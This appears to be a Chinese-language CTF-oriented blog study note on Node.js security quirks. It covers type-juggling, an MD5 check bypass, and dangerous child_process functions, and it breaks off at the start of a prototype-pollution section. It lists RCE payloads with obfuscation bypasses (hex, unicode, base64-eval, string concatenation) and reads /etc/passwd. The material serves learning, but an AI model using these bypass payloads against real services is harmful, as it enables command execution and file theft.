@@ -1,0 +1,708 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
+  <link rel="icon" href="/img/icon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="So1Lupus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Nodejs 入门（借鉴总结） 1.1 nodejs语言的缺点1.1.1 大小写特性toUpperCase()toLowerCase() 对于toUpperCase(): 字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;对于toLowerCase(): 字符&quot;K&quot;经过toL">
+<meta property="og:type" content="article">
+<meta property="og:title" content="nodejs">
+<meta property="og:url" content="http://example.com/2022/09/28/nodejs/index.html">
+<meta property="og:site_name" content="So1Lupus">
+<meta property="og:description" content="Nodejs 入门（借鉴总结） 1.1 nodejs语言的缺点1.1.1 大小写特性toUpperCase()toLowerCase() 对于toUpperCase(): 字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;对于toLowerCase(): 字符&quot;K&quot;经过toL">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/image-20220307155913395.png">
+<meta property="article:published_time" content="2022-09-28T13:19:19.000Z">
+<meta property="article:modified_time" content="2022-09-28T13:22:30.000Z">
+<meta property="article:author" content="So1Lupus">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/image-20220307155913395.png">
+  
+  
+  
+  <title>nodejs - So1Lupus</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>So1Lupus</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="nodejs"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-09-28 21:19" pubdate>
+          2022年9月28日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          59 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">nodejs</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Nodejs-入门"><a href="#Nodejs-入门" class="headerlink" title="Nodejs 入门"></a>Nodejs 入门</h1><p>（借鉴总结）</p>
+<h3 id="1-1-nodejs语言的缺点"><a href="#1-1-nodejs语言的缺点" class="headerlink" title="1.1 nodejs语言的缺点"></a>1.1 nodejs语言的缺点</h3><h4 id="1-1-1-大小写特性"><a href="#1-1-1-大小写特性" class="headerlink" title="1.1.1 大小写特性"></a>1.1.1 大小写特性</h4><p>toUpperCase()<br>toLowerCase()</p>
+<p>对于toUpperCase(): 字符<code>&quot;ı&quot;</code>、<code>&quot;ſ&quot;</code> 经过toUpperCase处理后结果为 <code>&quot;I&quot;</code>、<code>&quot;S&quot;</code><br>对于toLowerCase(): 字符<code>&quot;K&quot;</code>经过toLowerCase处理后结果为<code>&quot;k&quot;</code>(这个K不是K)</p>
+<h4 id="1-1-1-弱类型比较"><a href="#1-1-1-弱类型比较" class="headerlink" title="1.1.1 弱类型比较"></a>1.1.1 弱类型比较</h4><p><strong>大小比较</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span>==<span class="hljs-string">&#x27;1&#x27;</span>); <span class="hljs-comment">//true </span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span>&gt;<span class="hljs-string">&#x27;2&#x27;</span>); <span class="hljs-comment">//false </span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;1&#x27;</span>&lt;<span class="hljs-string">&#x27;2&#x27;</span>); <span class="hljs-comment">//true </span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">111</span>&gt;<span class="hljs-string">&#x27;3&#x27;</span>); <span class="hljs-comment">//true </span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;111&#x27;</span>&gt;<span class="hljs-string">&#x27;3&#x27;</span>); <span class="hljs-comment">//false </span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;asd&#x27;</span>&gt;<span class="hljs-number">1</span>); <span class="hljs-comment">//false</span><br></code></pre></td></tr></table></figure>
+
+<p>总结：数字与字符串比较时，会优先将纯数字型字符串转为数字之后再进行比较；而字符串与字符串比较时，会将字符串的第一个字符转为ASCII码之后再进行比较，因此就会出现第五行代码的这种情况；而非数字型字符串与任何数字进行比较都是false</p>
+<p><em>数组的比较：</em></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([]==[]); <span class="hljs-comment">//false </span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([]&gt;[]); <span class="hljs-comment">//false</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([<span class="hljs-number">6</span>,<span class="hljs-number">2</span>]&gt;[<span class="hljs-number">5</span>]); <span class="hljs-comment">//true </span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([<span class="hljs-number">100</span>,<span class="hljs-number">2</span>]&lt;<span class="hljs-string">&#x27;test&#x27;</span>); <span class="hljs-comment">//true </span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]&lt;<span class="hljs-string">&#x27;2&#x27;</span>);  <span class="hljs-comment">//true </span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([<span class="hljs-number">11</span>,<span class="hljs-number">16</span>]&lt;<span class="hljs-string">&quot;10&quot;</span>); <span class="hljs-comment">//false</span><br></code></pre></td></tr></table></figure>
+
+<p>总结：<code>空数组之间比较永远为false`，</code>数组之间比较只比较数组间的第一个值<code>，对第一个值采用前面总结的比较方法，数组与非数值型字符串比较，</code>数组永远小于非数值型字符串&#96;&#96;；数组与数值型字符串比较，取第一个之后按前面总结的方法进行比较</p>
+<p><em>还有一些比较特别的相等：</em></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-literal">null</span>==<span class="hljs-literal">undefined</span>) <span class="hljs-comment">// 输出：true </span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-literal">null</span>===<span class="hljs-literal">undefined</span>) <span class="hljs-comment">// 输出：false </span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">NaN</span>==<span class="hljs-title class_">NaN</span>)  <span class="hljs-comment">// 输出：false </span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">NaN</span>===<span class="hljs-title class_">NaN</span>)  <span class="hljs-comment">// 输出：false</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>变量拼接</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">5</span>+[<span class="hljs-number">6</span>,<span class="hljs-number">6</span>]); <span class="hljs-comment">//56,3 </span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;5&quot;</span>+<span class="hljs-number">6</span>); <span class="hljs-comment">//56 </span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;5&quot;</span>+[<span class="hljs-number">6</span>,<span class="hljs-number">6</span>]); <span class="hljs-comment">//56,6 </span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;5&quot;</span>+[<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;6&quot;</span>]); <span class="hljs-comment">//56,6</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="1-1-3-MD5的绕过"><a href="#1-1-3-MD5的绕过" class="headerlink" title="1.1.3 MD5的绕过"></a>1.1.3 MD5的绕过</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">a &amp;&amp; b &amp;&amp; a.<span class="hljs-property">length</span>===b.<span class="hljs-property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="hljs-title function_">md5</span>(a+flag)===<span class="hljs-title function_">md5</span>(b+flag)<br></code></pre></td></tr></table></figure>
+
+<p>a[x]&#x3D;1&amp;b[x]&#x3D;2</p>
+<p>数组会被解析成<code>[object Object]</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">a=&#123;<span class="hljs-string">&#x27;x&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125;<br>b=&#123;<span class="hljs-string">&#x27;x&#x27;</span>:<span class="hljs-string">&#x27;2&#x27;</span>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a+<span class="hljs-string">&quot;flag&#123;xxx&#125;&quot;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b+<span class="hljs-string">&quot;flag&#123;xxx&#125;&quot;</span>)<br><br>a=[<span class="hljs-number">1</span>]<br>b=[<span class="hljs-number">2</span>]<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a+<span class="hljs-string">&quot;flag&#123;xxx&#125;&quot;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b+<span class="hljs-string">&quot;flag&#123;xxx&#125;&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<h4 id="1-1-4-编码绕过"><a href="#1-1-4-编码绕过" class="headerlink" title="1.1.4 编码绕过"></a>1.1.4 编码绕过</h4><p><strong>16进制编码</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;a&quot;</span>===<span class="hljs-string">&quot;\x61&quot;</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>unicode编码</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\u0061&quot;</span>===<span class="hljs-string">&quot;a&quot;</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>base编码</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">eval</span>(<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(<span class="hljs-string">&#x27;Y29uc29sZS5sb2coImhhaGFoYWhhIik7&#x27;</span>,<span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_">toString</span>())<br></code></pre></td></tr></table></figure>
+
+<h2 id="1-2-危险函数"><a href="#1-2-危险函数" class="headerlink" title="1.2 危险函数"></a>1.2 危险函数</h2><h3 id="1-2-1-RCE"><a href="#1-2-1-RCE" class="headerlink" title="1.2.1 RCE"></a>1.2.1 RCE</h3><p>Function环境下没有require函数，不能获得child_process模块，我们可以通过使用process.mainModule.constructor._load来代替require。</p>
+<p>eval(js代码)</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-number">1.</span><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;open /System/Applications/Calculator.app&#x27;</span>);<br><span class="hljs-number">2.</span><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;open /System/Applications/Calculator.app&#x27;</span>);<br><span class="hljs-number">3.</span><span class="hljs-variable language_">global</span>.<span class="hljs-property">process</span>.<span class="hljs-property">mainModule</span>.<span class="hljs-property">constuctor</span>.<span class="hljs-title function_">_load</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<h3 id="1-2-2-文件读写"><a href="#1-2-2-文件读写" class="headerlink" title="1.2.2 文件读写"></a>1.2.2 文件读写</h3><h4 id="一、读取"><a href="#一、读取" class="headerlink" title="一、读取"></a>一、读取</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-number">1.</span> <span class="hljs-title function_">readFile</span>()<br><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>).<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>,<span class="hljs-string">&#x27;utf-8&#x27;</span>,(err,data))=&gt;(<br>&#123;<br>    <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;);<br><span class="hljs-number">2.</span><span class="hljs-title function_">readFileSync</span>()<br><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>).<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>,<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<h4 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-number">1.</span><span class="hljs-title function_">writeFileSync</span>()<br><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>).<span class="hljs-title function_">writeFileSync</span>(<span class="hljs-string">&#x27;input.txt&#x27;</span>,<span class="hljs-string">&#x27;sss&#x27;</span>);<br><span class="hljs-number">2.</span><span class="hljs-title function_">writeFile</span>()<br><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>).<span class="hljs-title function_">writeFile</span>(<span class="hljs-string">&#x27;input.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">err</span>)=&gt;</span>&#123;&#125;)<br></code></pre></td></tr></table></figure>
+
+<h4 id="1-2-3-nodejs危险函数-RCE-bypass"><a href="#1-2-3-nodejs危险函数-RCE-bypass" class="headerlink" title="1.2.3 nodejs危险函数-RCE bypass"></a>1.2.3 nodejs危险函数-RCE bypass</h4><p><strong>bypass</strong></p>
+<p>原型：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;cat flag.txt&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>字符拼接：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>)[<span class="hljs-string">&#x27;exe&#x27;</span>%2b<span class="hljs-string">&#x27;cSync&#x27;</span>](<span class="hljs-string">&#x27;cat flag.txt&#x27;</span>)<br><span class="hljs-comment">//(%2b就是+的url编码)</span><br><br><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)[<span class="hljs-string">&quot;exe&quot;</span>.<span class="hljs-title function_">concat</span>(<span class="hljs-string">&quot;cSync&quot;</span>)](<span class="hljs-string">&quot;open /System/Applications/Calculator.app/&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>编码绕过：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>)[<span class="hljs-string">&quot;\x65\x78\x65\x63\x53\x79\x6e\x63&quot;</span>](<span class="hljs-string">&#x27;cat flag.txt&#x27;</span>)<br><span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>)[<span class="hljs-string">&quot;\u0065\u0078\u0065\u0063\u0053\x79\x6e\x63&quot;</span>](<span class="hljs-string">&#x27;cat fl001g.txt&#x27;</span>)<br><span class="hljs-built_in">eval</span>(<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(<span class="hljs-string">&#x27;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdvcGVuIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwLycpOw==&#x27;</span>,<span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_">toString</span>()) <span class="hljs-comment">//弹计算器</span><br></code></pre></td></tr></table></figure>
+
+<p>模板拼接：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>)[<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="hljs-string">&#x27;open /System/Applications/Calculator.app/&#x27;</span>）<br></code></pre></td></tr></table></figure>
+
+<p>其他函数：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">&quot;sleep 3&quot;</span>); <br><span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;sleep 3&quot;</span>); <br><span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">execFile</span>(<span class="hljs-string">&quot;/bin/sleep&quot;</span>,[<span class="hljs-string">&quot;3&quot;</span>]); *<span class="hljs-comment">//调用某个可执行文件，在第二个参数传args* </span><br><span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">spawn</span>(<span class="hljs-string">&#x27;sleep&#x27;</span>, [<span class="hljs-string">&#x27;3&#x27;</span>]); <br><span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">spawnSync</span>(<span class="hljs-string">&#x27;sleep&#x27;</span>, [<span class="hljs-string">&#x27;3&#x27;</span>]); <br><span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">execFileSync</span>(<span class="hljs-string">&#x27;sleep&#x27;</span>, [<span class="hljs-string">&#x27;3&#x27;</span>]);<br></code></pre></td></tr></table></figure>
+
+<h3 id="1-3-全局变量-global的属性"><a href="#1-3-全局变量-global的属性" class="headerlink" title="1.3 全局变量(global的属性)"></a>1.3 全局变量(global的属性)</h3><h4 id="1-exports-：-将本模块接口进行导出。另一种表达方式是-module-exports-。"><a href="#1-exports-：-将本模块接口进行导出。另一种表达方式是-module-exports-。" class="headerlink" title="1.exports ： 将本模块接口进行导出。另一种表达方式是 module.exports 。"></a>1.exports ： 将本模块接口进行导出。另一种表达方式是 module.exports 。</h4><h4 id="2-require-：-包含本模块导入其他模块的信息。require-main-等同于-module-。"><a href="#2-require-：-包含本模块导入其他模块的信息。require-main-等同于-module-。" class="headerlink" title="2.require ： 包含本模块导入其他模块的信息。require.main 等同于 module 。"></a>2.require ： 包含本模块导入其他模块的信息。require.main 等同于 module 。</h4><h4 id="3-module-：指向当前模块的引用，包含当前模块的路径、目录等信息。"><a href="#3-module-：指向当前模块的引用，包含当前模块的路径、目录等信息。" class="headerlink" title="3.module ：指向当前模块的引用，包含当前模块的路径、目录等信息。"></a>3.module ：指向当前模块的引用，包含当前模块的路径、目录等信息。</h4><h4 id="4-filename-：表示当前模块文件的路径（包含模块文件名的全路径）"><a href="#4-filename-：表示当前模块文件的路径（包含模块文件名的全路径）" class="headerlink" title="4.__filename ：表示当前模块文件的路径（包含模块文件名的全路径）"></a>4.__filename ：表示当前模块文件的路径（包含模块文件名的全路径）</h4><h4 id="5-dirname-：表示当前模块所在文件夹的路径"><a href="#5-dirname-：表示当前模块所在文件夹的路径" class="headerlink" title="5.__dirname ：表示当前模块所在文件夹的路径"></a>5.__dirname ：表示当前模块所在文件夹的路径</h4><h2 id="2-nodejs原型链污染"><a href="#2-nodejs原型链污染" class="headerlink" title="2 nodejs原型链污染"></a>2 nodejs原型链污染</h2><h3 id="2-1-prototype原型"><a href="#2-1-prototype原型" class="headerlink" title="2.1 prototype原型"></a>2.1 prototype原型</h3><p><strong>简介：</strong></p>
+<p>对于使用过基于类的语言 (如 Java 或 C++) 的开发者们来说，JavaScript 实在是有些令人困惑 —— JavaScript 是动态的，本身不提供一个 <code>class</code> 的实现。即便是在 ES2015&#x2F;ES6 中引入了 <code>class</code> 关键字，但那也只是语法糖，JavaScript 仍然是基于原型的。</p>
+<p>当谈到继承时，JavaScript 只有一种结构：对象。每个实例对象（object）都有一个私有属性（称之为 <strong>proto</strong> ）指向它的构造函数的原型对象（<strong>prototype</strong>）。该原型对象也有一个自己的原型对象（__proto__），层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<strong>原型链</strong>中的最后一个环节。</p>
+<p>几乎所有 JavaScript 中的对象都是位于原型链顶端的 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object"><code>Object</code></a> 的实例。</p>
+<p>尽管这种原型继承通常被认为是 JavaScript 的弱点之一，但是原型继承模型本身实际上比经典模型更强大。例如，在原型模型的基础上构建经典模型相当简单。</p>
